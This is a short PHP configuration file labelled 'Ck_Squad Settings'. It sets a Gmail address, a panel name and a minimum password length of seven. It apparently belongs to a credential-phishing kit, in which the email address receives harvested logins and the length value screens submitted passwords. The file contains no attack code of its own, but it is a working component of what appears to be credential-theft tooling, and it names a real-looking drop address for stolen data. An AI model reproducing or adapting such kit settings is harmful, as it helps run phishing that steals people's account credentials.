<?php
/* [$$$-------------- Ck_Squad Settings --------------$$$] */
$ck_squad_email = 'inidomain901@gmail.com';
$ck_squad_panel = 'ck';
$ck_squad_minpass = '7';
?>